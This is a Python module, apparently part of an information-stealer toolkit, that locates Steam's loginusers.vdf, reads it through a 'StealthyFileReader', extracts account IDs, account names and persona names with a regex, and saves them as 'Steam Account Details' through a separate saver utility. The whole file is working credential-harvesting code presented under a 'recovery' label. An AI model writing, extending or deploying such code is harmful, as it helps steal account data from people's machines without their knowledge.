import os
import re
import json
import logging
from Utilities.DataSaver import DataSaverUtility

from Utilities.StealthReader import StealthyFileReader


logging.basicConfig(level=logging.INFO)


class SteamLoginRecovery:

    STEAM_PATH = "C:/Program Files (x86)/Steam/config"

    @staticmethod
    def _parse_vdf_content(content):
        """Parse the VDF content to extract users' data."""
        pattern = re.compile(r'''
            "(?P<UserID>\d+)"\s*{\s*
            "AccountName"\s*"(?P<AccountName>[^"]+)"\s*
            "PersonaName"\s*"(?P<PersonaName>[^"]+)"
        ''', re.VERBOSE)

        return [match.groupdict() for match in pattern.finditer(content)]

    def extract_login_data(self):
        """Extracts Steam login data from loginusers.vdf."""
        login_file = os.path.join(self.STEAM_PATH, "loginusers.vdf")
        
        if not os.path.isfile(login_file):
            logging.warning(f"{login_file} does not exist.")
            return None
        

        reader = StealthyFileReader(login_file)
        content = reader.read_text()
        print(f"Reading {login_file} using: {reader.method_used}")

        return self._parse_vdf_content(content)

    def _format_data(self, data):
        """Formats the extracted data into a desired structure."""
        return json.dumps(
            [{"Type": "Steam Account Details", **user_info} for user_info in data], 
            indent=4
        )

    def save_steam_login(self):
        """Saves the formatted Steam login data."""
        data = self.extract_login_data()
        
        if not data:
            logging.warning("No data to save.")
            return

        formatted_data = self._format_data(data)
        #logging.info(f"Saving data: {formatted_data}")
        DataSaverUtility.save_to_file(formatted_data)
